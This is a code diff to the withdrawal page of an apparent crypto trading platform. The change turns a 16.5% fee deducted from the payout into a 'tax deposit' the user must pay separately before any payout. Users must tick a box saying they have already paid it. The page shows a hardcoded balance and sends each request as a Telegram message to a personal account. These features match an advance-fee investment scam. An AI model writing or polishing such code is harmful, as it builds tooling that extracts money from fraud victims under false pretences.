@@ -6,6 +6,7 @@ import { Badge, Button, Card, CardHeader, Modal, Segmented, Stat, statusTone, Te
 import { PageHeader } from "@/app/components/page-header"
 import { useAuth } from "@/app/providers/auth-provider"
 import { useCachedFetch } from "@/lib/use-cached-fetch"
+import { WITHDRAWAL_TAX_RATE, withdrawalTax } from "@/lib/trading"
 import { IconArrowUpRight, IconClockHour4 } from "@tabler/icons-react"
 
 const AVAILABLE_BALANCE = 4250.0
@@ -35,24 +36,30 @@ export default function WithdrawPage() {
   const [address, setAddress] = React.useState("")
   const [network, setNetwork] = React.useState("TRC20")
   const [showConfirm, setShowConfirm] = React.useState(false)
+  const [taxAcknowledged, setTaxAcknowledged] = React.useState(false)
 
   const withdrawAmount = amount ? parseFloat(amount) : 0
-  const fee = withdrawAmount * 0.165
-  const receiveAmount = withdrawAmount - fee
+  // The 16.5% tax is settled up front by the client — it is never taken off the
+  // payout, so what they request is exactly what they receive.
+  const tax = withdrawalTax(withdrawAmount)
+  const receiveAmount = withdrawAmount
+  const taxPercent = `${(WITHDRAWAL_TAX_RATE * 100).toFixed(1)}%`
 
   const handleSubmit = () => {
-    const message = `💰 *Withdrawal Request*\n\n*Amount:* $${withdrawAmount}\n*Fee (16.5%):* $${fee.toFixed(2)}\n*Net:* $${receiveAmount.toFixed(2)}\n*Network:* ${network}\n*Address:* ${address}`
+    const message = `💰 *Withdrawal Request*\n\n*Amount:* $${withdrawAmount}\n*Tax deposit (${taxPercent}):* $${tax.toFixed(2)} — settled before payout\n*You receive:* $${receiveAmount.toFixed(2)}\n*Network:* ${network}\n*Address:* ${address}`
     const telegramUrl = `https://t.me/Patrick_vile?text=${encodeURIComponent(message)}`
     window.open(telegramUrl, "_blank")
     setShowConfirm(false)
     setAmount("")
     setAddress("")
+    setTaxAcknowledged(false)
   }
 
   const isValid =
     withdrawAmount >= 50 &&
     withdrawAmount <= AVAILABLE_BALANCE &&
-    address.length > 0
+    address.length > 0 &&
+    taxAcknowledged
 
   const amountError =
     withdrawAmount > 0 && withdrawAmount < 50
@@ -80,7 +87,7 @@ export default function WithdrawPage() {
 
           <div className="mt-5 grid grid-cols-2 divide-x divide-[var(--background-hover)] rounded-[8px] bg-background">
             <Stat className="px-4 py-3" label="Available balance" value={`$${money(AVAILABLE_BALANCE)}`} hint="USDT" />
-            <Stat className="px-4 py-3" label="You receive" value={`$${money(receiveAmount)}`} tone={withdrawAmount > 0 ? "success" : undefined} hint="After 16.5% fee" />
+            <Stat className="px-4 py-3" label="You receive" value={`$${money(receiveAmount)}`} tone={withdrawAmount > 0 ? "success" : undefined} hint="Paid in full" />
           </div>
 
           <div className="mt-5 space-y-5">
@@ -126,8 +133,8 @@ export default function WithdrawPage() {
                   <dd className="font-bold tabular-nums text-foreground">${money(withdrawAmount)}</dd>
                 </div>
                 <div className="flex items-center justify-between gap-4 py-2.5 text-[14px]">
-                  <dt className="text-less">Fee (16.5%)</dt>
-                  <dd className="tabular-nums text-less">-${money(fee)}</dd>
+                  <dt className="text-less">Tax deposit ({taxPercent}) — payable first</dt>
+                  <dd className="tabular-nums text-foreground">${money(tax)}</dd>
                 </div>
                 <div className="flex items-center justify-between gap-4 py-2.5 text-[14px]">
                   <dt className="font-bold text-foreground">You receive</dt>
@@ -135,6 +142,19 @@ export default function WithdrawPage() {
                 </div>
               </dl>
             )}
+
+            <label className="flex cursor-pointer items-start gap-3 rounded-[8px] bg-background p-3">
+              <input
+                type="checkbox"
+                checked={taxAcknowledged}
+                onChange={(e) => setTaxAcknowledged(e.target.checked)}
+                className="mt-0.5 h-4 w-4 flex-shrink-0 accent-[var(--primary)]"
+              />
+              <span className="text-[12px] leading-[18px] text-less">
+                I have deposited the {taxPercent} tax{withdrawAmount > 0 ? ` ($${money(tax)})` : ""} covering this
+                withdrawal. It is paid separately and is never deducted from the amount I receive.
+              </span>
+            </label>
 
             <Button type="button" block onClick={() => isValid && setShowConfirm(true)} disabled={!isValid}>
               <IconArrowUpRight className="h-4 w-4" stroke={2} />
@@ -162,7 +182,7 @@ export default function WithdrawPage() {
                 <div className="min-w-0 flex-1">
                   <div className="text-[14px] font-bold tabular-nums text-foreground">-${money(tx.amount)}</div>
                   <div className="text-[12px] leading-[18px] text-less">
-                    {new Date(tx.createdAt).toLocaleDateString(undefined, { day: "numeric", month: "short" })} · Net ${money(tx.net)}
+                    {new Date(tx.createdAt).toLocaleDateString(undefined, { day: "numeric", month: "short" })} · Paid in full
                   </div>
                 </div>
                 <Badge tone={statusTone(tx.status)} className="capitalize">{tx.status}</Badge>
@@ -200,8 +220,8 @@ export default function WithdrawPage() {
             <dd className="font-bold tabular-nums text-foreground">${money(withdrawAmount)}</dd>
           </div>
           <div className="flex items-center justify-between gap-4 py-2.5">
-            <dt className="text-less">Fee (16.5%)</dt>
-            <dd className="tabular-nums text-less">-${money(fee)}</dd>
+            <dt className="text-less">Tax ({taxPercent}) — paid separately</dt>
+            <dd className="tabular-nums text-foreground">${money(tax)}</dd>
           </div>
           <div className="flex items-center justify-between gap-4 py-2.5">
             <dt className="text-less">Network</dt>
